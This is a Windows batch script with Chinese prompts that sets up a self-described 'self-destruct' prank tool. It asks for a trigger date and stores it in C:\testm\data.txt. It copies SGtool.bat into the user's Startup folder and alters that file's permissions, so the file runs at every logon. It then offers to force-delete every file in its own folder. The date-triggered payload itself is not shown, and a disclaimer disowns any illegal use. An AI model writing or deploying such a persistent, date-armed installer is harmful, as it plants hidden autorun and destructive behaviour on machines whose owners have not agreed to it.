@echo off
cls
@echo =======================================================
@echo 		    使用及免責聲明
@echo.
@echo - 作者呼籲使用者不要將此工具用於盈利和/或非法目的
@echo - 作者亦不承擔使用者將此工具用於盈利和/或非法目的之任何後果和/或法律責任
@echo - 若使用者繼續使用此工具，即表示使用者已閱讀、了解並同意本聲明暨同意書的
@echo   所有內容上述說明，且使用者瞭解此工具使用後，有任何後續問題與作者無關。
@echo. 	
@echo =======================================================
echo.
@echo ===================== 自我毀滅 ========================
echo.
@echo ============= 顧名思義，所以要來搗蛋啦 ================
echo.
@echo --------------------  注意  ------------------------
@echo.
@echo       輸入日期格式不對，會讓自我毀滅無作用!!!!!
@echo ----------------------------------------------------

:start
echo.
SET disdata=0
:: -------- 1. 請使用者輸入日期
@echo - 請依下方範例輸入日期
@echo %date:~0,4%-%date:~5,2%-%date:~8,2%
echo.
@echo - 若遇到2020/4/1，請補 0，向下方範例那樣
@echo 2020-04-01
echo.
@SET /P disdata=在此輸入日期後，按下 Enter : 
echo.
@echo ___________________________________________________
echo.
@echo - 請問您輸入的 %disdata% 是正確的嗎?
echo.
choice /C YN /M "是請按 Y，不是請按 N"
echo.
if errorlevel 2 goto doNo
if errorlevel 1 goto doYes

:doNo
echo ---- 再次重新輸入
goto start

:doYes
@echo ___________________________________________________
echo.
echo --- 使用者已確認，處理中...
md C:\testm
:: -------- 2. 將使用者輸入日期建立成文件檔並放入所設定位置
echo %disdata% > C:\testm\data.txt
@echo.
IF  EXIST C:\testm\data.txt ( echo ---##  data.txt 已存在 )
:: -------- 加入目前使用者並給予檔案權限
ICACLS  C:\testm\data.txt /GRANT %USERNAME%:F
goto doit

:doit
:: -------- 3. copy SGtool.bat 到啟動資料夾

@echo ___________________________________________________
echo.
echo --- 進行複製中....
@echo.
copy "%~dp0SGtool.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
:: -------- 加入目前使用者並給予檔案權限
ICACLS  "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SGtool.bat" /GRANT %USERNAME%:(D,WDAC)
@echo.
IF  EXIST "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SGtool.bat" ( echo ---##  SGtool.bat 已存在 )
echo.
start C:\testm
start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" /B /MIN

@echo ___________________________________________________
echo.
@echo - 請問要幫您刪除檔案嗎?
@echo 	(不要就人工手動刪除而已，不影響萬惡小工具運作) 
echo.
choice /C YN /M "要請按 Y，不要請按 N"
echo.
if errorlevel 2 goto toCancel
if errorlevel 1 goto toDestroy


:: 4. 刪除此地方所有東西
:toDestroy
del /f /q "%~dp0"
IF  NOT EXIST "%~dp0" (echo --- 已銷毀...)
goto end

:toCancel
goto end

:end
@echo ___________________________________________________
echo.
echo --- 自我毀滅已準備就緒~ 坐等時機來臨~ o_O+ ---
echo.

@echo __ 本著作係採用 創用 CC 姓名標示-非商業性-禁止改作 4.0 國際 授權條款授權. __
echo.
PAUSE
